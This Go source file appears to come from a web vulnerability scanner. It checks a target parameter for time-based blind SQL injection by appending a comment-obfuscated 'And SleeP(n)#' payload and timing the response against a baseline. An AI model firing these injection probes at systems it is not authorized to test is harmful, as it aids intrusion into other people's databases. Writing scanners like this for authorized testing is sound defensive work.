package sqlmap

import (
	"fmt"
	"github.com/yhy0/Jie/logging"
	JieOutput "github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"time"
)

/**
  @author: yhy
  @since: 2023/2/9
  @desc: 时间盲注
**/

func (sql *Sqlmap) checkTimeBasedBlind(pos int, closeType int, lineBreak bool) {
	var payload string
	err, standardRespTime := getNormalRespondTime(sql)
	if err != nil {
		//因获取响应时间出错 不再继续测试时间盲注
		logging.Logger.Debugln("尝试检测 TimBased-Blind响应时间失败")
		return
	}

	logging.Logger.Debugf("网站的正常响应时间应小于: %v ms", standardRespTime)
	if lineBreak {
		payload = fmt.Sprintf(`%v/**/And/**/SleeP(%v)#`, "\n"+CloseType[closeType], standardRespTime*2/1000+3)
	} else {
		payload = fmt.Sprintf(`%v/**/And/**/SleeP(%v)#`, CloseType[closeType], standardRespTime*2/1000+3)
	}

	for index, param := range sql.Variations.Params {
		if index == pos {
			logging.Logger.Debugln("尝试时间注入")

			payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, param.Value+payload, sql.Method)

			var res *httpx.Response
			if sql.Method == "GET" {
				res, err = httpx.Request(payload, sql.Method, "", false, sql.Headers)
			} else {
				res, err = httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
			}

			if err != nil {
				continue
			}
			
			if res.ServerDurationMs > standardRespTime+2000 {
				logging.Logger.Debugf("存在基于时间的 SQL 注入: [参数名:%v 原值:%v]", param.Name, param.Value)

				JieOutput.OutChannel <- JieOutput.VulMessage{
					DataType: "web_vul",
					Plugin:   "SQL Injection",
					VulData: JieOutput.VulData{
						CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
						Target:      sql.Url,
						Ip:          "",
						Param:       param.Name,
						Request:     res.RequestDump,
						Response:    res.ResponseDump,
						Payload:     payload,
						Description: fmt.Sprintf("Time-Based Blind SQL Injection: [%v:%v]", param.Name, param.Value),
					},
					Level: JieOutput.Critical,
				}
				return
			} else {
				continue
			}

		}

	}
}
